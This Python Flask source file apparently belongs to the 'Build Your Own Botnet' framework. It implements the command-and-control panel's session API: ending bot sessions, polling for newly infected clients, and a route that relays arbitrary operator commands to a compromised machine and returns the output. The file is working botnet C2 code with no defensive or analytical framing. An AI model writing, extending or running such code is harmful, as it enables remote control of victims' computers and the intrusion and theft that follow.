import json
from flask import Blueprint, request, redirect, url_for, flash
from flask_login import login_user, logout_user, current_user, login_required
from buildyourownbotnet import app, db, server
from buildyourownbotnet.core import database
from buildyourownbotnet.models import Session


# Blueprint
session = Blueprint('session', __name__)


@session.route("/api/session/remove", methods=["POST"])
@login_required
def session_remove():
	"""End an active session."""
	session_uid = request.form.get('session_uid')

	if not session_uid:
		flash('Invalid session UID', 'danger')
		return redirect(url_for('sessions'))

	# kill connection to C2
	owner_sessions = server.c2.sessions.get(current_user.username, {})

	if session_uid and session_uid in owner_sessions:
		session_thread = owner_sessions[session_uid]
		try:
			session_thread.kill()
		except Exception as e:
			return "Error ending session - please try again."

	# remove session from database
	s = Session.query.filter_by(owner=current_user.username, uid=session_uid)
	if s:
		s.delete()
		db.session.commit()
		return "Session {} removed.".format(session_uid)


@session.route("/api/session/cmd", methods=["POST"])
@login_required
def session_cmd():
	"""Send commands to clients and return the response."""
	session_uid = request.form.get('session_uid')

	# validate session id is valid integer
	if not session_uid:
		flash("Invalid bot UID: " + str(session_uid))
		return redirect(url_for('sessions'))

	command = request.form.get('cmd')

	# get user sessions
	owner_sessions = server.c2.sessions.get(current_user.username, {})

	if session_uid in owner_sessions:
		session_thread = owner_sessions[session_uid]

		# store issued task in database
		task = database.handle_task({'task': command, 'session': session_thread.info.get('uid')})

		# send task and get response
		session_thread.send_task(task)
		response = session_thread.recv_task()

		# update task record with result in database
		result = database.handle_task(response)
		return str(result['result']).encode()

	else:
		return "Bot " + str(session_uid) + " is offline or does not exist."


@session.route("/api/session/poll", methods=["GET"])
@login_required
def session_poll():
	"""Return list of sessions (JSON)."""
	new_sessions = []
	for s in database.get_sessions_new(current_user.id):
		new_sessions.append(s.serialize())
		s.new = False
		db.session.commit()
	return json.dumps(new_sessions)